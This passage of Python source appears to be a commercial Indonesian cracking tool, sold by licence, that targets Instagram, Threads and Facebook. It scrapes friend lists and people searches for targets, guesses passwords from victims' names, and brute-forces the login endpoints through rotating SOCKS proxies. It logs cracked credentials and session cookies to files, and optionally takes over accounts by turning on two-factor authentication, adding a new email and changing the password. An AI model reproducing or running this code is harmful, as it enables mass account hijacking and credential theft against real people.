                            tree.add(f'\r{cookie}')
                            tree.add(f"{headers['User-Agent']}\n")
                            save = f'{user}|{pswd}|{cookie}\n'
                       printf(tree)
                       with open(file+'OK.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       if followlu is True:
                          self.bot_follow(cookie)
                       break
                   elif 'two_factor_required' in str(resp.text):
                       if show_change_acc is True:
                          tree = Tree('\r╭ Two Factor Aktiv                                ', style='red')
                          tree.add(f'Username : {user}')
                          tree.add(f'Password : {pswd}\n')
                          printf(tree)
                       self.tw +=1
                       open(file+'2F.txt','a', encoding='utf-8').write(f'{user}|{pswd}\n')
                       break
                   elif 'https://i.instagram.com/challenge/' in str(resp.text):
                       if show_change_acc is True:
                          tree = Tree('\r╭ Challenge Action                                   ', style='yellow')
                          tree.add(f'Username : {user}')
                          tree.add(f'Password : {pswd}\n')
                          printf(tree)
                       self.cp +=1
                       open(file+'CP.txt','a', encoding='utf-8').write(f'{user}|{pswd}\n')
                       break
               except requests.exceptions.ConnectionError: time.sleep(10); self.ExecLogin(user, passwd, remove_all, show_change_acc,file='data/user/login/')
        self.lp +=1

    def ExecAjax(self, user, password, remove_all=None, show_change_acc=None, followlu=None, file='data/user/login/'):
        requ = Require()
        prox = requ.socks()
        byps = requests.Session()
        kont = random.randint
        uaig = requ.UserAgent()
        curl = byps.get('https://www.instagram.com/api/v1/web/data/shared_data/')
        print(f'{END}[{BLUE}+{END}] {self.lp}:{len(self.id)} self.ok: {self.ok} self.cp: {self.cp} self.two: {self.tw}',end='\r');sys.stdout.flush()
        while True:
            try:
                headers = {
                    'Host': 'www.instagram.com',
                    'x-ig-www-claim': 'hmac.AR2wXxoGBXHHmo_oGWeyB4jobxmgxKg1CFaxOQgCbiWGaeve',
                    'x-requested-with': 'XMLHttpRequest',
                    'dpr': '2',
                    'x-csrftoken': byps.cookies['csrftoken'],
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1010009888',
                    'user-agent': uaig,
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-asbd-id': '129477',
                    'referer': 'https://www.instagram.com/accounts/login/?force_authentication=1&enable_fb_login=1&next=%2Foauth%2Fauthorize%3Fclient_id%3D200289238967899%26redirect_uri%3Dhttps%3A%2F%2Fauth.meta.com%2Flogin%2Finstagram%2Fresponse%2F%3Fstate%3DATDH11v70fYq9DjYGQ4StSM9zpcnTHKsa_uH65JPUdq4YzUF9W9lYUKHccVOl5tz4XmWx9d84ejnSuX8Lz7RlkixjGmXSkVzaqnXnn75OwKsY3CYBHcAfrrLIwmYYQ201uQdEAY5r7-_1xOw9Pexg7bHw-D6PhoYUoA1i9ALmAdXyv02KC8R97pKcQFeelSvFmijKPdrghvCI0TrJSDz8KypUcMbJiR72_St9QGJhJV-DrHswCBOcG3UJTyGorZ7tqkG8Y9GuBskypL1vP_c41vJMPr4y14CmCnpy3K8S7RbQIPKkz_nwcaxyzwR_9klLa-VIkhj6iDJXzvDgaeqmeKwfWyIkhM3VB_0ALJGKBo_pQYIzLE_vwbuAtVBJW6Ef4_97N6w6P4rl2g89TIEeihp2qmHJMWNbBWjSrl0cslf-D5CNt0IwStMIYocmYcfiTDYgLhFwqXs-_3v14Hp1ClUg5BlCB1Q_OTg58ChG0oLrGbUYC4GAjaYfPNzChws3lgMYTqVlFAbui-_bI9PlX3SLJVgoXpIjddnyQE5W27KgkaU_674BjC5t_Dn0QF2sI0PpWK_XzN-axuvtLj04llHKf53Y-2d-CRIW5IOu9VIusDpHN9VqXlUJkNoBBZT8yblwjtlxoslQsVpvm4KnVi0xa1KJVccsVnTUyWJEgMII2Nb4Mm_hDm-OZjel3CU0IZ2DVkr-hbCadesXuT0TBkfaIMU4AZVHp7KJNqM6vLkk6ctj6QzWMPD_zg67TxgFR3Jp2ra3wSkX83-2C02cbhR0pgyr6BiFdQixrkMEfniIueuxpPKBD-xBfKVcAXaAPj-wOXLY6LWysDycwurTh7Pc7T3SRj_fS8o7UHR49vfrBS3WZ9H5suSPhQ%26response_type%3Dcode%26scope%3Duser_profile%26state%3DATDH11v70fYq9DjYGQ4StSM9zpcnTHKsa_uH65JPUdq4YzUF9W9lYUKHccVOl5tz4XmWx9d84ejnSuX8Lz7RlkixjGmXSkVzaqnXnn75OwKsY3CYBHcAfrrLIwmYYQ201uQdEAY5r7-_1xOw9Pexg7bHw-D6PhoYUoA1i9ALmAdXyv02KC8R97pKcQFeelSvFmijKPdrghvCI0TrJSDz8KypUcMbJiR72_St9QGJhJV-DrHswCBOcG3UJTyGorZ7tqkG8Y9GuBskypL1vP_c41vJMPr4y14CmCnpy3K8S7RbQIPKkz_nwcaxyzwR_9klLa-VIkhj6iDJXzvDgaeqmeKwfWyIkhM3VB_0ALJGKBo_pQYIzLE_vwbuAtVBJW6Ef4_97N6w6P4rl2g89TIEeihp2qmHJMWNbBWjSrl0cslf-D5CNt0IwStMIYocmYcfiTDYgLhFwqXs-_3v14Hp1ClUg5BlCB1Q_OTg58ChG0oLrGbUYC4GAjaYfPNzChws3lgMYTqVlFAbui-_bI9PlX3SLJVgoXpIjddnyQE5W27KgkaU_674BjC5t_Dn0QF2sI0PpWK_XzN-axuvtLj04llHKf53Y-2d-CRIW5IOu9VIusDpHN9VqXlUJkNoBBZT8yblwjtlxoslQsVpvm4KnVi0xa1KJVccsVnTUyWJEgMII2Nb4Mm_hDm-OZjel3CU0IZ2DVkr-hbCadesXuT0TBkfaIMU4AZVHp7KJNqM6vLkk6ctj6QzWMPD_zg67TxgFR3Jp2ra3wSkX83-2C02cbhR0pgyr6BiFdQixrkMEfniIueuxpPKBD-xBfKVcAXaAPj-wOXLY6LWysDycwurTh7Pc7T3SRj_fS8o7UHR49vfrBS3WZ9H5suSPhQ%26logger_id%3D44604dd6-5405-451b-8980-eeb0a12528b3',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                }

                payload = {
                    'enc_password':'#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()),'RecodeLuYa'),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({"force_authentication":"1","enable_fb_login":"1","next":"/oauth/authorize?client_id=200289238967899&redirect_uri=https://auth.meta.com/login/instagram/response/?state=ATDH11v70fYq9DjYGQ4StSM9zpcnTHKsa_uH65JPUdq4YzUF9W9lYUKHccVOl5tz4XmWx9d84ejnSuX8Lz7RlkixjGmXSkVzaqnXnn75OwKsY3CYBHcAfrrLIwmYYQ201uQdEAY5r7-_1xOw9Pexg7bHw-D6PhoYUoA1i9ALmAdXyv02KC8R97pKcQFeelSvFmijKPdrghvCI0TrJSDz8KypUcMbJiR72_St9QGJhJV-DrHswCBOcG3UJTyGorZ7tqkG8Y9GuBskypL1vP_c41vJMPr4y14CmCnpy3K8S7RbQIPKkz_nwcaxyzwR_9klLa-VIkhj6iDJXzvDgaeqmeKwfWyIkhM3VB_0ALJGKBo_pQYIzLE_vwbuAtVBJW6Ef4_97N6w6P4rl2g89TIEeihp2qmHJMWNbBWjSrl0cslf-D5CNt0IwStMIYocmYcfiTDYgLhFwqXs-_3v14Hp1ClUg5BlCB1Q_OTg58ChG0oLrGbUYC4GAjaYfPNzChws3lgMYTqVlFAbui-_bI9PlX3SLJVgoXpIjddnyQE5W27KgkaU_674BjC5t_Dn0QF2sI0PpWK_XzN-axuvtLj04llHKf53Y-2d-CRIW5IOu9VIusDpHN9VqXlUJkNoBBZT8yblwjtlxoslQsVpvm4KnVi0xa1KJVccsVnTUyWJEgMII2Nb4Mm_hDm-OZjel3CU0IZ2DVkr-hbCadesXuT0TBkfaIMU4AZVHp7KJNqM6vLkk6ctj6QzWMPD_zg67TxgFR3Jp2ra3wSkX83-2C02cbhR0pgyr6BiFdQixrkMEfniIueuxpPKBD-xBfKVcAXaAPj-wOXLY6LWysDycwurTh7Pc7T3SRj_fS8o7UHR49vfrBS3WZ9H5suSPhQ&response_type=code&scope=user_profile&state=ATDH11v70fYq9DjYGQ4StSM9zpcnTHKsa_uH65JPUdq4YzUF9W9lYUKHccVOl5tz4XmWx9d84ejnSuX8Lz7RlkixjGmXSkVzaqnXnn75OwKsY3CYBHcAfrrLIwmYYQ201uQdEAY5r7-_1xOw9Pexg7bHw-D6PhoYUoA1i9ALmAdXyv02KC8R97pKcQFeelSvFmijKPdrghvCI0TrJSDz8KypUcMbJiR72_St9QGJhJV-DrHswCBOcG3UJTyGorZ7tqkG8Y9GuBskypL1vP_c41vJMPr4y14CmCnpy3K8S7RbQIPKkz_nwcaxyzwR_9klLa-VIkhj6iDJXzvDgaeqmeKwfWyIkhM3VB_0ALJGKBo_pQYIzLE_vwbuAtVBJW6Ef4_97N6w6P4rl2g89TIEeihp2qmHJMWNbBWjSrl0cslf-D5CNt0IwStMIYocmYcfiTDYgLhFwqXs-_3v14Hp1ClUg5BlCB1Q_OTg58ChG0oLrGbUYC4GAjaYfPNzChws3lgMYTqVlFAbui-_bI9PlX3SLJVgoXpIjddnyQE5W27KgkaU_674BjC5t_Dn0QF2sI0PpWK_XzN-axuvtLj04llHKf53Y-2d-CRIW5IOu9VIusDpHN9VqXlUJkNoBBZT8yblwjtlxoslQsVpvm4KnVi0xa1KJVccsVnTUyWJEgMII2Nb4Mm_hDm-OZjel3CU0IZ2DVkr-hbCadesXuT0TBkfaIMU4AZVHp7KJNqM6vLkk6ctj6QzWMPD_zg67TxgFR3Jp2ra3wSkX83-2C02cbhR0pgyr6BiFdQixrkMEfniIueuxpPKBD-xBfKVcAXaAPj-wOXLY6LWysDycwurTh7Pc7T3SRj_fS8o7UHR49vfrBS3WZ9H5suSPhQ&logger_id=44604dd6-5405-451b-8980-eeb0a12528b3"}),
                    'trustedDeviceRecords':'{}',
                    'username':user
                }
                cookies = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                break
            except:pass
        for pswd in password:
            if pswd:
               try:
                  payload.update({'enc_password':'#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()),pswd)})
                  payload2 = urllib.parse.urlencode(payload)
                  proxies1 = {'http': 'socks4://' + random.choice(prox)}
                  response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies={'cookie':cookies}, data=payload2, headers=headers, proxies=proxies1).text
                  if "userId" in str(response):
                       self.ok +=1
                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                       followers, following, postingan = self.friends_user(user)
                       if remove_all is not None:
                          try:
                              on_authen = requ.OnAuthenA2f(cookie)
                              pemulihan, secretkey, status = on_authen['kode-pemulihan'], on_authen['SecretKey'], on_authen['success-a2f']
                              aktif_ora  = 'Di Aktifkan' if status is not False else 'Tidak Aktif'
                              ganti_mail = requ.AddEmail(cookie)
                              curl, email, status_email = ganti_mail['Url'], ganti_mail['email'], ganti_mail['di-konfirmasi']
                              konfirmasi_ora = 'Di Konfirmasi' if status_email is True else 'Tidak Di Konfirmasi'
                              ganti_sandi = requ.RePassword(cookie, pswd)
                              dadi_ora = f'{pswd}' if ganti_sandi is None else f'{ganti_sandi} (Di Ubah)'
                              tree = Tree('\rlogged in user                                    \n',style='italic green')
                              tree.add(f'Username : {user}')
                              tree.add(f'Password : {dadi_ora}')
                              tree.add(f'Followers : {followers}')
                              tree.add(f'Following : {following}')
                              tree.add(f'Postingan : {postingan}')
                              tree.add(f'Status two factor  : {aktif_ora}')
                              tree.add(f'Kode Pemulihan a2f : {pemulihan}')
                              tree.add(f'Secret Key : {secretkey}')
                              tree.add(f'Email New  : {email} (Status {konfirmasi_ora})')
                              tree.add(f'Url Email  : {curl} (Simpan Di Catatan Anda)')
                              tree.add(f'Cookie     : {cookie}\n')
                              save = f'{user}|{dadi_ora}|{email}|{curl}|{secretkey}|{pemulihan}|{cookie}\n'
                          except Exception as e:
                                 tree = Tree('\rlogged in user                                       \n',style='italic green')
                                 tree.add(f'Username : {user}')
                                 tree.add(f'Password : {pswd}')
                                 tree.add(f'\r{cookie}\n')
                                 save = f'{user}|{pswd}|{cookie}\n'
                       else:
                            tree = Tree('\rlogged in user                                    \n',style='italic green')
                            tree.add(f'Username : {user}')
                            tree.add(f'Password : {pswd}')
                            tree.add(f'Followers : {followers}')
                            tree.add(f'Following : {following}')
                            tree.add(f'Postingan : {postingan}')
                            tree.add(f'\r{cookie}\n')
                            save = f'{user}|{pswd}|{cookie}\n'
                       printf(tree)
                       with open(file+'OK.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       if followlu is True:
                          self.bot_follow(cookie)
                       break
               except requests.exceptions.ConnectionError: time.sleep(10);self.ExecAjax(user, password, remove_all, show_change_acc, followlu, file='data/user/login/')
        self.lp +=1

    def ExecThreads(self, user, password, remove_all=None, show_change_acc=None, followlu=None, file='data/user/login/'):
        requ = Require()
        prox = requ.socks()
        byps = requests.Session()
        kont = random.randint
        uaig = requ.UserAgent()
        curl = byps.get('https://www.threads.net/login').text
        print(f'{END}[{BLUE}+{END}] {self.lp}:{len(self.id)} self.ok: {self.ok} self.cp: {self.cp} self.two: {self.tw}',end='\r');sys.stdout.flush()
        while True:
            try:
                headers = {}
                csrftoken, mid = re.search('{"csrf_token":"(.*?)"', str(curl)).group(1),re.search('{"mid":{"value":"(.*?)"',str(curl)).group(1)
                headers.update({
                    'Host': 'www.threads.net',
                    'content-length': '294',
                    'x-ig-app-id': '1412234116260832',
                    'x-instagram-ajax': '0',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': csrftoken,
                    'accept': '*/*',
                    'origin': 'https://www.threads.net',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.threads.net/login',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                })
                payload = {
                    'enc_password':'#PWD_INSTAGRAM_BROWSER:10:1701518720:RecodeTerusDiJualOm!',
                    'optIntoOneTap':'false',
                    'queryParams':'{}',
                    'stopDeletionNonce':'',
                    'textAppStopDeletionToken':'',
                    'username':'Khamdihi Dev'
                }
                break
            except requests.exceptions.ConnectionError:
                time.sleep(5)
                self.ExecThreads(user,password, remove_all, show_change_acc, followlu,file='data/user/login/')
            except:pass
        for pswd in password:
            if pswd:
               try:
                   payload.update({'enc_password':'#PWD_INSTAGRAM_BROWSER:0:%s:%s'%(int(time.time()), pswd),'username': user})
                   cookies   = {'cookie': f'dpr=2;mid={mid};cb=1_2023_11_29_;csrftoken={csrftoken}'}
                   signature = urllib.parse.urlencode(payload)
                   response  = byps.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', data=signature, headers=headers, cookies=cookies).text
                   if "userId" in response:
                       self.ok +=1
                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                       followers, following, postingan = self.friends_user(user)
                       if remove_all is not None:
                          try:
                              on_authen = requ.OnAuthenA2f(cookie)
                              pemulihan, secretkey, status = on_authen['kode-pemulihan'], on_authen['SecretKey'], on_authen['success-a2f']
                              aktif_ora  = 'Di Aktifkan' if status is not False else 'Tidak Aktif'
                              ganti_mail = requ.AddEmail(cookie)
                              curl, email, status_email = ganti_mail['Url'], ganti_mail['email'], ganti_mail['di-konfirmasi']
                              konfirmasi_ora = 'Di Konfirmasi' if status_email is True else 'Tidak Di Konfirmasi'
                              ganti_sandi = requ.RePassword(cookie, pswd)
                              dadi_ora = f'{pswd}' if ganti_sandi is None else f'{ganti_sandi} (Di Ubah)'
                              tree = Tree('\rlogged in user                                    \n',style='italic green')
                              tree.add(f'Username : {user}')
                              tree.add(f'Password : {dadi_ora}')
                              tree.add(f'Followers : {followers}')
                              tree.add(f'Following : {following}')
                              tree.add(f'Postingan : {postingan}')
                              tree.add(f'Status two factor  : {aktif_ora}')
                              tree.add(f'Kode Pemulihan a2f : {pemulihan}')
                              tree.add(f'Secret Key : {secretkey}')
                              tree.add(f'Email New  : {email} (Status {konfirmasi_ora})')
                              tree.add(f'Url Email  : {curl} (Simpan Di Catatan Anda)')
                              tree.add(f'Cookie     : {cookie}\n')
                              save = f'{user}|{dadi_ora}|{email}|{curl}|{secretkey}|{pemulihan}|{cookie}\n'
                          except Exception as e:
                                 tree = Tree('\rlogged in user                                       \n',style='italic green')
                                 tree.add(f'Username : {user}')
                                 tree.add(f'Password : {pswd}')
                                 tree.add(f'Cookie   : {cookie}\n')
                                 save = f'{user}|{pswd}|{cookie}\n'
                       else:
                            tree = Tree('\rlogged in user                                    \n',style='italic green')
                            tree.add(f'Username : {user}')
                            tree.add(f'Password : {pswd}')
                            tree.add(f'Followers : {followers}')
                            tree.add(f'Following : {following}')
                            tree.add(f'Postingan : {postingan}')
                            tree.add(f'\r{cookie}\n')
                            save = f'{user}|{pswd}|{cookie}\n'
                       printf(tree)
                       with open(file+'OK.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       if followlu is True:
                          self.bot_follow(cookie)
                       break
               except requests.exceptions.ConnectionError:
                   time.sleep(5)
                   self.ExecThreads(user,password, remove_all, show_change_acc, followlu,file='data/user/login/')
        self.lp +=1

class Facebook:
    def __init__(self):
        self.data,self.data = {}, []
        self.req = requests.Session()
        self.xxx = Brute()
        self.id, self.ok, self.cp, self.lp = [], 0, 0, 1
        if self.id:self.id.clear()

    def get_info(self, kueh, toke):
        try:
            url = self.req.get('https://graph.facebook.com/me?access_token=%s'%(toke), cookies={'cookie':kueh}).json()['name']
            return(url)
        except:self.login()

    def bahasa(self, xxx):
        try:
            url = requests.get('https://mbasic.facebook.com/language/', cookies={'cookie':xxx}).text
            crl = bsp(url,'html.parser')
            for bhs in crl.find_all('h3'):
                curl = crl.find('form',method='post')['action']
                if 'id_ID' in str(curl):
                   data = {
                      'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(url)).group(1),
                      'jazoest': re.search('name="jazoest" value="(.*?)"', str(url)).group(1)}
                   resp = requests.post('https://mbasic.facebook.com%s'%(curl), data=data, cookies={'cookie':xxx}).text
                   if 'Bahasa yang Anda inginkan untuk terjemahan postingan' in str(resp):return True
                else:continue
        except Exception as e:exit(e)

    def Menu(self):
        if os.path.isfile('.fbcokie.txt') is True:
           cokie = open('.fbcokie.txt','r',encoding='utf-8').read()
           token = open('.fbtoken.txt','r',encoding='utf-8').read()
        else:
           cokie = self.login()
           if cokie == True:
              self.Menu()
           else:self.login()
        fullname = self.get_info(cokie, token)
        bs = self.bahasa(cokie)
        print(f'\n   {END}• New Fiture {GREEN}Facebook Brute Force v1')
        print(f'   {END}• Login Sebagai: {GREEN}{fullname}{END} \n')
        ShowRich().nel(f'''  {P2}[{H2}01{P2}] Dump User Friends  {P2}[{H2}02{P2}] Dump Users Pencarian
  {P2}[{H2}03{P2}] Check Hasil Crack  {P2}[{H2}04{P2}] Kembali/Exit''')
        self.put_menu(cokie, token)

    def put_menu(self, kueh, token):
        x = Input(f'   {P2}└─> {H2}')
        if x == '1' or x == '01':
           ShowRich().nel(f'{P2} Masukan id user, gunakan tanda koma sebagai pemisah, Jangan Gunakan Username')
           auid = input(f'   └─> ').split(',')
           self.exec_friends(auid,kueh,token)

        elif x == '2' or x == '02':
           ShowRich().nel(f'{P2} Masukan Nama Bebas 1 Nama Setara Dengan 99-100 Akun. Gunakan Tanda Koma Sebagai Pemisah')
           nama = input(f'   └─> ').split(',')
           for i in nama:
               e = self.SearchName(f'https://mbasic.facebook.com/search/people/?q={i}&source=filter',kueh)
           self.pwd()
        elif x == '3' or x == '03':
           ShowRich().nel(f'''  {P2}[{H2}01{P2}] Akun OK    {P2}[{H2}02{P2}] Akun CP
  {P2}[{H2}03{P2}] Akun A2F   {P2}[{H2}00{P2}] Back Menu''')
           h = Input(f'   {P2}└─> {H2}')
           if h in ('1','01'):dir='OK-FB.txt'
           elif h in ('2','02'):dir='CP-FB.txt'
           elif h in ('3','03'):exit('\n └─> Fiture Tidak Ada')
           print(f'\n[ {GREEN}Semua Result Akun {dir} ]\n')
           q = 0
           for w in open(f'data/user/login/{dir}','r').read().splitlines():
               q +=1
               if dir == 'OK.txt':
                  print('\r %s%s. %s%s\n'%(GREEN,q,END,w))
               else:
                  print('\r %s%s. %s%s'%(RED,q,END,w))
           exit()

    def SearchName(self, url,coki):
        try:
            array = self.id
            link = bsp(requests.get(url,cookies={'cookie':coki}).text,'html.parser')
            for i in link.find_all("a",href=True):
                print(f'   └─> Berhasil dump {len(self.id)}',end='\r');sys.stdout.flush()
                if '/profile.php?' in str(i['href']):
                   try:
                       pk, nm = re.search('id=(\d+)',str(i['href'])).group(1), re.search('<img alt="(.*?), profile picture"', str(i)).group(1)
                       xyz = '%s<=>%s'%(pk,nm)
                       if pk not in array:
                          if nm == '':pass
                          else:array.append(xyz)
                   except: continue
                else:
                   if 'profile picture"' in i or '<img alt=' in str(i):
                       try:
                           pk,nm = re.search('/(.*?)?eav',i['href']).group(1).split('?')[0],re.search('<img alt="(.*?), profile picture"', str(i)).group(1)
                           xyz = '%s<=>%s'%(pk,nm)
                           if xyz not in array:array.append(xyz)
                       except:pass

            for r in link.find_all("a",href=True):
                if 'Lihat Hasil Selanjutnya' in r.text:
                   self.SearchName(r.get('href'),coki)
        except:pass

    def exec_friends(self,auid, kueh, token, limit=None):
        for i in auid:
            try:
                xyz = {'access_token':token,'after':'' if limit is None else limit}
                url = self.req.get(f'https://graph.facebook.com/{i}/friends', params=xyz,cookies={'cookie':kueh}).json()
                for xxx in url['data']:
                    done = '%s<=>%s'%(xxx['id'], xxx['name'])
                    print(f'   └─> Berhasil dump {len(self.id)}',end='\r');sys.stdout.flush()
                    if done not in self.id:self.id.append(done)

                if 'paging' in str(url):
                   after = url['paging']['cursors']['after']
                   self.exec_friends(auid, kueh, token ,after)
            except:pass
        self.pwd()

    def login(self):
        data, ses = {}, requests.Session()
        self.xxx.Clear()
        self.xxx.Logos()
        ShowRich().nel(f'{P2}Login Menggunakan Cookie Akun Facebook!, Gunakan Akun Tumbal/Baru Untuk Login')
        cokie = {'cookie':input(f'   └─> ')}
        stats = self.TokenEaab(cokie)
        if stats is True:self.Menu()
        else:exit('\n   └─> Invalid Cookie')

    def TokenEaab(self, cokie):
        try:
            req = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1', cookies = cokie).text 
            act = re.search('act=(\d+)',str(req)).group(1)
            res = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&act=%s&breakdown_regrouping=1'%(act), cookies = cokie).text 
            xyz = re.search('window.__accessToken="(.*?)"', str(res)).group(1) 
            open('.fbcokie.txt','w').write(cokie.get('cookie'))
            open('.fbtoken.txt','w').write(xyz)
            print('   └─> Berhasil Login');time.sleep(2)
            return True
        except Exception as e:
            return False

    def pwd(self):
        ShowRich().nel(f' {P2}Tambahkan Password Angka Di Belakang Nama chose (y/t). {K2}Note Proses Mungkin Membutuhkan Waktu Sedikit Lama Jika Anda Menambahkan Pw tambahan!')
        add = Input(f'   {P2}└─> {H2}').lower()
        if add == 'y' or add == 'ya':
           pwd = input(f'\n   └─> Masukan Angka Minimal 2 : ').split(',')
           apaiya=pwd
        else:apaiya=False
        bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        apacb = datetime.now()
        kontl = '%s/%s/%s'%(bulan[apacb.month-1], apacb.day, apacb.year)
        ShowRich().nel(f' {P2}• Date Now : {H2}{kontl} Jam: {apacb.hour}:{apacb.minute} {P2}\n • Proses Sedang Di Mulai, Tunggu Dan Mainkan Mode Pesawat',True)
        with executor(max_workers=30) as bold:
           for kontol in self.id:
               username, nama = kontol.split('<=>')
               password = self.pw_fb(nama,apaiya)
               bold.submit(self.ExecLoginFB , username, password)
        exit()

    def pw_fb(self, fullname, xnxx):
        self.one, self.two = [], []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:
                if xnxx is False:
                   self.one.append(nama+'123');self.one.append(nama+'1234');self.one.append(nama+'12345');self.one.append(nama.capitalize()+'123')
                else:
                   for angka in xnxx:
                       self.one.append(nama+'123');self.one.append(nama+'1234');self.one.append(nama+'12345');self.one.append(nama+angka)
            else:self.one.append(nama);self.one.append(fullname);self.one.append(nama+'123');self.one.append(nama+'1234');self.one.append(nama+'12345');self.one.append(nama.capitalize()+'123')
        for r in self.one:
            if r in self.two:pass
            else:self.two.append(r)
        return(self.two)

    def ExecLoginFB(self, user, password, file='data/user/login/'):
        session = requests.Session()
        requ  = Require()
        prox  = proxies if len(proxies) > 0 else ['184.181.217.210:4145']
        print(f'└─> {self.lp}/{len(self.id)} self.ok: {self.ok} self.cp: {self.cp}', end='\r');sys.stdout.flush()
        for pswd in password:
            try:
                self.hs = session.get('https://web.facebook.com/').text
                try:
                    self.jd = re.search('"_js_datr","(.*?)",', self.hs).group(1)
                    cookies = {'cookie': ';'.join(['%s=%s'%(name,value) for name, value in session.cookies.get_dict().items()]) +';_js_datr='+ self.jd}
                except:
                    cookies = {'cookie': ';'.join(['%s=%s'%(name,value) for name, value in session.cookies.get_dict().items()])}
                headers = {
                   'Host': 'web.facebook.com',
                   'cache-control': 'max-age=0',
                   'dpr': '2',
                   'viewport-width': '980',
                   'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                   'sec-ch-ua-mobile': '?0',
                   'sec-ch-ua-platform': 'Linux',
                   'sec-ch-ua-full-version-list': '"Google Chrome";v="119.0.6045.67", "Chromium";v="119.0.6045.67", "Not?A_Brand";v="24.0.0.0"',
                   'sec-ch-prefers-color-scheme': 'light',
                   'upgrade-insecure-requests': '1',
                   'origin': 'https://web.facebook.com',
                   'content-type': 'application/x-www-form-urlencoded',
                   'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                   'sec-fetch-site': 'same-origin',
                   'sec-fetch-mode': 'navigate',
                   'sec-fetch-user': '?1',
                   'sec-fetch-dest': 'document',
                   'referer': 'https://web.facebook.com/?_rdc=1&_rdr',
                   'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                }
                data = {
                   'lsd': re.search('name="lsd" value="(.*?)"',str(self.hs)).group(1),
                   'jazoest': re.search('name="jazoest" value="(.*?)"',str(self.hs)).group(1),
                   'email': user,
                   'cred_type': '100',
                   'login_source': 'device_based_login_add_account',
                   'savepass': '',
                   'persistent': '',
                   'encpass': '#PWD_BROWSER:0:%s:%s'%(int(time.time()),pswd)
                }
                proi = {'http': 'socks5://' + random.choice(prox)}
                response = session.post('https://web.facebook.com/login/device-based/regular/login/', cookies=cookies, headers=headers, data=data, proxies=proi)
                if 'c_user' in session.cookies.get_dict():
                       cokie = ';'.join(['%s=%s'%(name,value) for name, value in session.cookies.get_dict().items()])
                       tree = Tree('\rlogged in user                                \n', style='italic green')
                       tree.add(f'Username : {user}')
                       tree.add(f'Password : {pswd}')
                       tree.add(cokie)
                       printf(tree)
                       save = f'{user}|{pswd}|{cokie}\n'
                       with open(file+'OK-FB.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       self.ok +=1
                       break
                elif 'checkpoint' in session.cookies.get_dict():
                       tree = Tree('\rcheckpoint                                         \n',style='italic yellow')
                       tree.add(f'Username : {user}')
                       tree.add(f'Password : {pswd}')
                       tree.add(headers['user-agent'])
                       printf(tree)
                       save = f'{user}|{pswd}\n'
                       with open(file+'CP-FB.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       self.cp +=1
                       break
                else:continue
            except requests.exceptions.ConnectionError:time.sleep(10)
        self.lp +=1

class AssetAndKey:
    def __init__(self) -> None:
        self.dire = 'data/user/login'
        self.byps = Brute()
        self.data,self.user,self.login = ('data'), ('user'), ('login')
        self.CreateDir()
        self.CekKeys()

    def CreateDir(self):
        try:os.mkdir(self.data)
        except:pass
        try:os.mkdir(self.data +'/'+ self.user)
        except:pass
        try:os.mkdir(self.data +'/'+ self.user +'/'+ self.login)
        except:pass

    def Keys(self):
        self.byps.Clear()
        self.byps.Logos()
        print(f"{END}[{BLUE}+{END}] Anda Belum Memiliki Licensi? Ketik 'key' Untuk Membeli!, Ketik 'info' Untuk Melihat List Harga")
        auth = input(f'{END}[{BLUE}?{END}] Masukan Licensi : ')
        xnxx = auth.lower()
        if auth == "'info'" or xnxx == 'info' or auth == 'info':
           print(f'''
{END}[ {BLUE}Harga Licensi Tools Babi {END}]

{END}[{BLUE}+{END}] 1 Minggu : {GREEN}30k
{END}[{BLUE}+{END}] 2 Minggu : {GREEN}60k
{END}[{BLUE}+{END}] 3 Minggu : {GREEN}90k
{END}[{BLUE}+{END}] 1 Month  : {GREEN}125k
{END}[{BLUE}+{END}] Open Source : {GREEN}250k\n''')
           input(f'{END}[{BLUE}ENTER UNTUK KEMBALI{END}]');self.Keys()
        elif auth == 'key' or auth == "'key'":
           print(f'{END}[{BLUE}+{END}] Anda Akan Di Arahkan Ke WhatsApp')
           os.system('xdg-open https://wa.me/+6285729416714')
           self.Keys()
        else:
           if len(auth) <=5:exit()
           else:self.confirm(auth)

